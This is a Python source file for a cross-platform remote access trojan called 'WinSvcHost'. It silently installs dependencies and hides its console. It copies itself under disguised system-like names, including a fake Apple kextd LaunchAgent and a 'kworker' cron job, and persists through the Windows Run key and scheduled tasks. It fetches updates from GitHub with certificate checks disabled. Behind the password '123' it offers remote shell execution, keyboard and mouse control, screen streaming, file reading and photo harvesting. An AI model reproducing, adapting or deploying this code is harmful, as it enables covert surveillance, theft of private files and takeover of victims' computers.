import sys, os, subprocess, platform, threading, time, socket, json, io, struct, hashlib, base64

# ── Auto-instalar dependencias silenciosamente ────────────────────────────────
def _pip(pkg):
    try:
        subprocess.run([sys.executable,"-m","pip","install",pkg,"--quiet",
                        "--break-system-packages"],
                       stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, timeout=90)
    except: pass

def _has(m):
    try: __import__(m); return True
    except: return False

if not _has("PIL"):       _pip("pillow")
if not _has("pyautogui"): _pip("pyautogui")
if not _has("PIL"):       _pip("Pillow==9.5.0")
if not _has("pyautogui"): _pip("pyautogui==0.9.54")
if platform.system() == "Windows":
    for _d in ["pygetwindow","pyscreeze","mouseinfo"]:
        if not _has(_d): _pip(_d)

# ── Ocultar consola Windows ───────────────────────────────────────────────────
if platform.system() == "Windows":
    try:
        import ctypes
        hwnd = ctypes.windll.kernel32.GetConsoleWindow()
        if hwnd: ctypes.windll.user32.ShowWindow(hwnd, 0)
    except: pass

try:
    import pyautogui
    pyautogui.FAILSAFE = False
    pyautogui.PAUSE    = 0
    PYAUTOGUI_OK = True
except: PYAUTOGUI_OK = False

try:
    from PIL import ImageGrab, Image
    PIL_OK = True
except: PIL_OK = False

# ── Constantes ────────────────────────────────────────────────────────────────
HOST         = "0.0.0.0"
COMMAND_PORT = 9000
SCREEN_PORT  = 9001
BEACON_PORT  = 9002
PASSWORD     = "123"
VERSION      = "1.7.2"
GITHUB_VER   = "https://raw.githubusercontent.com/windosvbs/WinSvcHost/main/version.txt"
GITHUB_SRC   = "https://raw.githubusercontent.com/windosvbs/WinSvcHost/main/WinSvcHost.py"

# ── SSL permisivo para actualizaciones ───────────────────────────────────────
import ssl as _ssl
_ctx = _ssl.create_default_context()
_ctx.check_hostname = False
_ctx.verify_mode    = _ssl.CERT_NONE

# ── Persistencia ─────────────────────────────────────────────────────────────
def setup():
    try:
        _sys = platform.system()
        cur  = os.path.abspath(__file__)
        if _sys == "Windows":
            import winreg, shutil
            ap   = os.environ.get("APPDATA", os.path.expanduser("~"))
            dest_dir  = os.path.join(ap, "Microsoft", "Windows", "WinSvcHost")
            dest_file = os.path.join(dest_dir, "WinSvcHost.py")
            os.makedirs(dest_dir, exist_ok=True)
            if os.path.normcase(cur) != os.path.normcase(dest_file):
                shutil.copy2(cur, dest_file)
            exe = sys.executable.replace("python.exe","pythonw.exe")
            if not os.path.exists(exe): exe = sys.executable
            # Registro Run
            k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                r"Software\\Microsoft\\Windows\\CurrentVersion\\Run",
                0, winreg.KEY_SET_VALUE)
            winreg.SetValueEx(k,"WinSvcHost",0,winreg.REG_SZ,f'"{exe}" "{dest_file}"')
            winreg.CloseKey(k)
            # Task Scheduler como respaldo
            try:
                task = (f'schtasks /Create /F /SC ONLOGON /TN "WinSvcHost" '
                        f'/TR "\\"{exe}\\" \\"{dest_file}\\"" /RL HIGHEST')
                subprocess.run(task, shell=True, stdout=subprocess.DEVNULL,
                               stderr=subprocess.DEVNULL)
            except: pass

        elif _sys == "Darwin":
            import shutil
            home      = os.path.expanduser("~")
            dest_dir  = os.path.join(home,"Library","Application Support",
                                     "com.apple.system.cache","kextd")
            dest_file = os.path.join(dest_dir,"kextd_helper.py")
            os.makedirs(dest_dir, exist_ok=True)
            if cur != dest_file: shutil.copy2(cur, dest_file)
            plist_dir  = os.path.join(home,"Library","LaunchAgents")
            plist_path = os.path.join(plist_dir,"com.apple.system.kextd.plist")
            os.makedirs(plist_dir, exist_ok=True)
            plist = f"""<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0"><dict>
    <key>Label</key><string>com.apple.system.kextd</string>
    <key>ProgramArguments</key><array>
        <string>{sys.executable}</string><string>{dest_file}</string>
    </array>
    <key>RunAtLoad</key><true/>
    <key>KeepAlive</key><true/>
    <key>StandardOutPath</key><string>/dev/null</string>
    <key>StandardErrorPath</key><string>/dev/null</string>
</dict></plist>"""
            with open(plist_path,"w") as f: f.write(plist)
            subprocess.run(["launchctl","unload",plist_path],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
            subprocess.run(["launchctl","load",plist_path],
                           stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

        elif _sys == "Linux":
            import shutil
            home      = os.path.expanduser("~")
            dest_dir  = os.path.join(home,".local","share","systemd","kworker")
            dest_file = os.path.join(dest_dir,"kworker.py")
            os.makedirs(dest_dir, exist_ok=True)
            if cur != dest_file: shutil.copy2(cur, dest_file)
            line = f"@reboot {sys.executable} {dest_file} &\n"
            r    = subprocess.run(["crontab","-l"], capture_output=True, text=True)
            if dest_file not in r.stdout:
                p = subprocess.Popen(["crontab","-"], stdin=subprocess.PIPE)
                p.communicate((r.stdout + line).encode())
    except: pass

setup()

# ── Auto-actualización desde GitHub ──────────────────────────────────────────
def _do_update(force=False):
    try:
        import urllib.request
        with urllib.request.urlopen(GITHUB_VER, timeout=15, context=_ctx) as r:
            remote = r.read().decode().strip()
        if remote == VERSION and not force: return False
        with urllib.request.urlopen(GITHUB_SRC, timeout=60, context=_ctx) as r:
            code = r.read()
        if len(code) < 1000: return False  # descarga inválida
        cur = os.path.abspath(__file__)
        tmp = cur + ".tmp"
        with open(tmp,"wb") as f: f.write(code)
        os.replace(tmp, cur)
        flags = 0x00000008 if platform.system()=="Windows" else 0
        subprocess.Popen([sys.executable, cur],
                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
                         creationflags=flags)
        os._exit(0)
    except: return False

def check_update():
    time.sleep(30)  # esperar que arranque todo
    while True:
        _do_update()
        time.sleep(3600)

# ── Helpers red ───────────────────────────────────────────────────────────────
def get_screen_size():
    try:
        if platform.system() == "Windows":
            import ctypes
            ctypes.windll.shcore.SetProcessDpiAwareness(2)
            return (ctypes.windll.user32.GetSystemMetrics(0),
                    ctypes.windll.user32.GetSystemMetrics(1))
    except: pass
    try: return pyautogui.size()
    except: return 1920, 1080

def recv_exact(conn, n):
    buf = b""
    while len(buf) < n:
        try:
            chunk = conn.recv(min(65536, n-len(buf)))
        except: return None
        if not chunk: return None
        buf += chunk
    return buf

def send_response(conn, res):
    data = json.dumps(res, ensure_ascii=False).encode("utf-8")
    conn.send(struct.pack(">I", len(data)) + data)

# ── Beacon UDP ────────────────────────────────────────────────────────────────
def beacon_loop():
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_BROADCAST, 1)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        msg = json.dumps({
            "type":     "beacon",
            "hostname": socket.gethostname(),
            "os":       platform.system(),
            "port":     COMMAND_PORT,
            "version":  VERSION
        }).encode()
        while True:
            try: sock.sendto(msg, ("<broadcast>", BEACON_PORT))
            except: pass
            time.sleep(2)
    except: pass

# ── Handler comandos ──────────────────────────────────────────────────────────
def handle_cmd(conn, addr):
    try:
        # Auth
        if conn.recv(1024).decode(errors="ignore").strip() != PASSWORD:
            conn.send(b"AUTH_FAIL"); conn.close(); return
        conn.send(b"AUTH_OK")
        sw, sh = get_screen_size()
        conn.send(json.dumps({"screen_w":sw,"screen_h":sh}).encode())
        conn.recv(16)  # OK del cliente

        conn.settimeout(60)

        while True:
            raw_len = recv_exact(conn, 4)
            if not raw_len: break
            length = struct.unpack(">I", raw_len)[0]
            if length > 50*1024*1024: break  # sanity check
            data = recv_exact(conn, length)
            if not data: break

            try: cmd = json.loads(data.decode("utf-8"))
            except: continue

            action = cmd.get("action","")
            res    = {"status":"ok","result":""}

            try:
                # ── Mouse ──────────────────────────────────────────────────
                if action == "mouse_move" and PYAUTOGUI_OK:
                    pyautogui.moveTo(cmd["x"], cmd["y"], duration=0, _pause=False)

                elif action == "mouse_click" and PYAUTOGUI_OK:
                    fn = pyautogui.doubleClick if cmd.get("double") else pyautogui.click
                    fn(cmd["x"], cmd["y"], button=cmd.get("button","left"), _pause=False)

                elif action == "mouse_down" and PYAUTOGUI_OK:
                    pyautogui.mouseDown(cmd["x"],cmd["y"],
                                        button=cmd.get("button","left"), _pause=False)

                elif action == "mouse_up" and PYAUTOGUI_OK:
                    pyautogui.mouseUp(cmd["x"],cmd["y"],
                                      button=cmd.get("button","left"), _pause=False)

                elif action == "mouse_scroll" and PYAUTOGUI_OK:
                    pyautogui.scroll(cmd.get("dy",3), x=cmd["x"], y=cmd["y"], _pause=False)

                # ── Teclado ────────────────────────────────────────────────
                elif action == "keypress" and PYAUTOGUI_OK:
                    pyautogui.press(cmd.get("key",""), _pause=False)

                elif action == "hotkey" and PYAUTOGUI_OK:
                    pyautogui.hotkey(*cmd.get("keys",[]), _pause=False)

                elif action == "type_text" and PYAUTOGUI_OK:
                    txt = cmd.get("text","")
                    try: pyautogui.write(txt, interval=0, _pause=False)
                    except: pyautogui.typewrite(txt, interval=0)

                # ── Shell ──────────────────────────────────────────────────
                elif action == "shell":
                    try:
                        r = subprocess.run(cmd.get("command",""), shell=True,
                                           capture_output=True, text=True,
                                           timeout=30, errors="replace")
                        res["result"] = (r.stdout + r.stderr)[:8000]
                    except subprocess.TimeoutExpired:
                        res["result"] = "[Timeout 30s]"
                    except Exception as e:
                        res["result"] = str(e)

                # ── Info sistema ───────────────────────────────────────────
                elif action == "sysinfo":
                    try:
                        import psutil
                        cpu  = psutil.cpu_percent(interval=0.1)
                        ram  = psutil.virtual_memory()
                        disk = psutil.disk_usage("/")
                        extra = {"cpu":cpu,"ram_used":ram.used,
                                 "ram_total":ram.total,"disk_used":disk.used,
                                 "disk_total":disk.total}
                    except: extra = {}
                    res["result"] = json.dumps({
                        "os":platform.system(),"version":platform.version(),
                        "machine":platform.machine(),"processor":platform.processor(),
                        "hostname":socket.gethostname(),
                        "screen_w":sw,"screen_h":sh,
                        "server_version":VERSION, **extra
                    })

                # ── Archivos ───────────────────────────────────────────────
                elif action == "ls":
                    path = cmd.get("path", os.path.expanduser("~"))
                    try:
                        items = []
                        with os.scandir(path) as it:
                            for entry in it:
                                try:
                                    st = entry.stat(follow_symlinks=False)
                                    items.append({
                                        "name":     entry.name,
                                        "is_dir":   entry.is_dir(),
                                        "size":     st.st_size,
                                        "modified": st.st_mtime
                                    })
                                except: pass
                        items.sort(key=lambda x:(not x["is_dir"], x["name"].lower()))
                        res["result"] = json.dumps({"path":path,"items":items},
                                                    ensure_ascii=False)
                    except Exception as e:
                        res["result"] = json.dumps({"path":path,"items":[],
                                                     "error":str(e)})

                elif action == "roots":
                    roots = []
                    if platform.system() == "Windows":
                        import string, shutil
                        for d in string.ascii_uppercase:
                            p = d + ":\\"
                            if os.path.exists(p):
                                try: sz = shutil.disk_usage(p).total
                                except: sz = 0
                                roots.append({"name":p,"is_dir":True,
                                              "size":sz,"modified":0})
                    else:
                        home = os.path.expanduser("~")
                        always = ["/", home]
                        if platform.system() == "Darwin":
                            always += [
                                os.path.join(home,"Desktop"),
                                os.path.join(home,"Documents"),
                                os.path.join(home,"Downloads"),
                                os.path.join(home,"Pictures"),
                                os.path.join(home,"Movies"),
                                os.path.join(home,"Music"),
                                "/Applications","/Volumes",
                            ]
                        for p in always:
                            if os.path.exists(p):
                                roots.append({"name":p,"is_dir":True,
                                              "size":0,"modified":0})
                    res["result"] = json.dumps({"items":roots,"path":""},
                                                ensure_ascii=False)

                elif action == "read_file":
                    fpath = cmd.get("path","")
                    try:
                        sz = os.path.getsize(fpath)
                        if sz > 500*1024*1024:
                            res["result"] = json.dumps({"error":"Archivo >500MB"})
                        else:
                            with open(fpath,"rb") as f: raw = f.read()
                            res["result"] = json.dumps({
                                "name": os.path.basename(fpath),
                                "data": base64.b64encode(raw).decode(),
                                "size": sz
                            })
                    except Exception as e:
                        res["result"] = json.dumps({"error":str(e)})

                elif action == "thumbnail":
                    fpath = cmd.get("path","")
                    size  = cmd.get("size", 120)
                    try:
                        img = Image.open(fpath)
                        img.thumbnail((size,size), Image.LANCZOS)
                        buf = io.BytesIO()
                        img.save(buf, format="JPEG", quality=65, optimize=True)
                        res["result"] = json.dumps({
                            "data": base64.b64encode(buf.getvalue()).decode(),
                            "w": img.width, "h": img.height
                        })
                    except Exception as e:
                        res["result"] = json.dumps({"error":str(e)})

                elif action == "photo_gallery":
                    path   = cmd.get("path","")
                    offset = cmd.get("offset", 0)
                    limit  = cmd.get("limit", 40)
                    EXTS   = {".jpg",".jpeg",".png",".gif",".bmp",
                              ".webp",".heic",".tiff",".raw",".cr2",".nef"}
                    try:
                        imgs = []
                        for root_d, dirs, files in os.walk(path):
                            dirs[:] = [d for d in dirs
                                       if not d.startswith(".") and
                                       d not in {"System Volume Information","$Recycle.Bin"}]
                            for f in files:
                                if os.path.splitext(f)[1].lower() in EXTS:
                                    fp = os.path.join(root_d, f)
                                    try:
                                        st = os.stat(fp)
                                        imgs.append({"name":f,"path":fp,
                                                     "size":st.st_size,
                                                     "modified":st.st_mtime})
                                    except: pass
                        imgs.sort(key=lambda x: x["modified"], reverse=True)
                        res["result"] = json.dumps({
                            "total":  len(imgs),
                            "offset": offset,
                            "items":  imgs[offset:offset+limit]
                        }, ensure_ascii=False)
                    except Exception as e:
                        res["result"] = json.dumps({"error":str(e),"total":0,"items":[]})

                elif action == "mac_photos":
                    home  = os.path.expanduser("~")
                    paths = []
                    candidates = [
                        os.path.join(home,"Pictures","Photos Library.photoslibrary","originals"),
                        os.path.join(home,"Pictures","Photos Library.photoslibrary","Masters"),
                        os.path.join(home,"Pictures"),
                        os.path.join(home,"Desktop"),
                        os.path.join(home,"Downloads"),
                    ]
                    for c in candidates:
                        if os.path.exists(c):
                            paths.append({"name":os.path.basename(c),
                                          "path":c,"is_dir":True,"size":0,"modified":0})
                    res["result"] = json.dumps({"items":paths,"path":""},
                                                ensure_ascii=False)

                elif action == "monitors":
                    mons = []
                    if platform.system() == "Windows":
                        try:
                            import ctypes
                            from ctypes import wintypes
                            _mons = []
                            def _cb(hm,hdc,rc,d):
                                _mons.append((rc.contents.left,rc.contents.top,
                                              rc.contents.right,rc.contents.bottom))
                                return True
                            PROC = ctypes.WINFUNCTYPE(ctypes.c_bool,ctypes.c_ulong,
                                                       ctypes.c_ulong,
                                                       ctypes.POINTER(wintypes.RECT),
                                                       ctypes.c_double)
                            ctypes.windll.user32.EnumDisplayMonitors(None,None,PROC(_cb),0)
                            for i,(l,t,r,b) in enumerate(_mons):
                                mons.append({"id":i,"x":l,"y":t,"w":r-l,"h":b-t})
                        except: mons=[{"id":0,"x":0,"y":0,"w":sw,"h":sh}]
                    else:
                        mons=[{"id":0,"x":0,"y":0,"w":sw,"h":sh}]
                    res["result"] = json.dumps({"monitors":mons})

                # ── Actualización ──────────────────────────────────────────
                elif action == "force_update":
                    def _upd():
                        time.sleep(0.5)
                        _do_update(force=True)
                    res["result"] = "Actualizando..."
                    threading.Thread(target=_upd, daemon=True).start()

                elif action == "version":
                    res["result"] = VERSION

                # ── Desinstalar ────────────────────────────────────────────
                elif action == "uninstall":
                    def _uninst():
                        time.sleep(1)
                        try:
                            _sys = platform.system()
                            if _sys == "Windows":
                                import winreg, shutil
                                try:
                                    k = winreg.OpenKey(winreg.HKEY_CURRENT_USER,
                                        r"Software\Microsoft\Windows\CurrentVersion\Run",
                                        0, winreg.KEY_SET_VALUE)
                                    winreg.DeleteValue(k,"WinSvcHost")
                                    winreg.CloseKey(k)
                                except: pass
                                try:
                                    subprocess.run("schtasks /Delete /TN WinSvcHost /F",
                                                   shell=True, stdout=subprocess.DEVNULL,
                                                   stderr=subprocess.DEVNULL)
                                except: pass
                                try:
                                    shutil.rmtree(os.path.join(
                                        os.environ.get("APPDATA",""),
                                        "Microsoft","Windows","WinSvcHost"),
                                        ignore_errors=True)
                                except: pass
                            elif _sys == "Darwin":
                                import shutil
                                plist = os.path.expanduser(
                                    "~/Library/LaunchAgents/com.apple.system.kextd.plist")
                                subprocess.run(["launchctl","unload",plist],
                                               stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
                                try: os.remove(plist)
                                except: pass
                                try:
                                    shutil.rmtree(os.path.expanduser(
                                        "~/Library/Application Support/com.apple.system.cache/kextd"),
                                        ignore_errors=True)
                                except: pass
                        except: pass
                        os._exit(0)
                    res["result"] = "Desinstalando..."
                    threading.Thread(target=_uninst, daemon=True).start()

            except Exception as e:
                res["result"] = f"Error interno: {e}"

            try: send_response(conn, res)
            except: break

    except: pass
    finally:
        try: conn.close()
        except: pass

# ── Handler pantalla ──────────────────────────────────────────────────────────
def handle_screen(conn, addr):
    try:
        if conn.recv(1024).decode(errors="ignore").strip() != PASSWORD:
            conn.send(b"AUTH_FAIL"); conn.close(); return
        conn.send(b"AUTH_OK")

        if platform.system() == "Windows":
            try:
                import ctypes
                ctypes.windll.shcore.SetProcessDpiAwareness(2)
            except: pass

        prev_hash   = None
        monitor_box = None
        quality     = 75

        conn.settimeout(10)

        while True:
            try:
                raw = conn.recv(512)
                if not raw: break
                req = raw.strip().decode(errors="ignore")
                if req.startswith("MONITOR:"):
                    try:
                        m = json.loads(req[8:])
                        monitor_box = (m["x"],m["y"],m["x"]+m["w"],m["y"]+m["h"])
                    except: monitor_box = None
                    continue
                if req.startswith("QUALITY:"):
                    try: quality = max(30, min(95, int(req[8:])))
                    except: pass
                    continue
                if req != "FRAME": continue
            except: break

            if not PIL_OK:
                try: conn.send(struct.pack(">I", 0))
                except: break
                continue

            try:
                s = ImageGrab.grab(bbox=monitor_box) if monitor_box else ImageGrab.grab()
                buf = io.BytesIO()
                s.save(buf, format="JPEG", quality=quality, optimize=False, subsampling=2)
                d = buf.getvalue()
                h = hashlib.md5(d).digest()
                if h == prev_hash:
                    conn.send(struct.pack(">I", 0))
                    continue
                prev_hash = h
                conn.send(struct.pack(">I", len(d)))
                conn.sendall(d)
            except:
                try: conn.send(struct.pack(">I", 0))
                except: break

    except: pass
    finally:
        try: conn.close()
        except: pass

# ── Servidor TCP genérico ─────────────────────────────────────────────────────
def run_server(port, handler):
    while True:
        try:
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            srv.bind((HOST, port))
            srv.listen(10)
            while True:
                try:
                    conn, addr = srv.accept()
                    conn.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
                    threading.Thread(target=handler, args=(conn,addr), daemon=True).start()
                except: break
            try: srv.close()
            except: pass
        except: pass
        time.sleep(3)

# ── Main ──────────────────────────────────────────────────────────────────────
if __name__ == "__main__":
    threading.Thread(target=run_server, args=(COMMAND_PORT, handle_cmd),    daemon=True).start()
    threading.Thread(target=run_server, args=(SCREEN_PORT,  handle_screen), daemon=True).start()
    threading.Thread(target=beacon_loop,   daemon=True).start()
    threading.Thread(target=check_update,  daemon=True).start()
    while True: time.sleep(60)
